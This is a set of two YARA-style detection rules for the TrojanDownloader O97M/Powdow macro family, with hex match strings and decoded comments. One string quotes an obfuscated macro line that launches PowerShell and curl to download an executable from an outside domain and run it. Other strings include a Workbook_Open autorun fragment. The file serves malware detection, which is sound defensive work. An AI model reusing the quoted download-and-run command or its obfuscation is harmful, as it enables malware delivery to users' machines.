
rule TrojanDownloader_O97M_Powdow_RVCF_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RVCF!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {6d 73 67 62 6f 78 22 65 72 72 6f 72 21 21 21 22 3a 5f 63 61 6c 6c 73 68 65 6c 6c 21 28 62 72 6f 6b 65 6e 73 68 6f 77 6f 66 66 29 65 6e 64 73 75 62 } //1 msgbox"error!!!":_callshell!(brokenshowoff)endsub
		$a_01_1 = {68 69 2e 78 78 78 2b 73 68 6f 77 6f 66 66 2e 6b 6f 6e 73 61 2b 73 68 6f 77 6f 66 66 2e 74 } //1 hi.xxx+showoff.konsa+showoff.t
		$a_01_2 = {73 75 62 77 6f 72 6b 62 6f 6f 6b 5f 6f 70 65 6e 28 29 } //1 subworkbook_open()
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_Powdow_RVCF_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RVCF!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {52 65 70 6c 61 63 65 28 22 63 6d 64 20 2f 63 20 70 6f 77 5e 61 33 69 69 78 39 37 39 72 73 5e 68 61 33 69 69 78 39 37 39 6c 6c 2f 57 20 30 31 20 63 5e 75 5e 72 6c 20 68 74 74 5e 70 73 3a 2f 2f 76 69 76 69 61 33 69 69 78 39 37 39 6e 64 61 73 38 2e 63 6f 6d 2f 62 62 2f 61 62 63 2e 61 33 69 69 78 39 37 39 5e 78 61 33 69 69 78 39 37 39 20 2d 6f 20 22 20 26 20 71 30 34 62 20 26 20 22 3b 22 20 26 20 71 30 34 62 2c 20 22 61 33 69 69 78 39 37 39 22 2c 20 22 65 22 29 } //1 Replace("cmd /c pow^a3iix979rs^ha3iix979ll/W 01 c^u^rl htt^ps://vivia3iix979ndas8.com/bb/abc.a3iix979^xa3iix979 -o " & q04b & ";" & q04b, "a3iix979", "e")
		$a_01_1 = {47 65 74 4f 62 6a 65 63 74 28 22 6e 65 77 22 20 26 20 63 6d 33 78 37 7a 6d 6e 63 20 26 20 22 44 35 2d 44 37 30 41 2d 34 33 38 42 2d 38 41 34 32 2d 39 38 34 22 20 26 20 43 4c 6e 67 28 31 2e 39 29 20 26 20 65 72 78 69 20 26 20 22 42 38 38 41 46 42 22 20 26 20 43 49 6e 74 28 38 2e 31 29 29 } //1 GetObject("new" & cm3x7zmnc & "D5-D70A-438B-8A42-984" & CLng(1.9) & erxi & "B88AFB" & CInt(8.1))
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}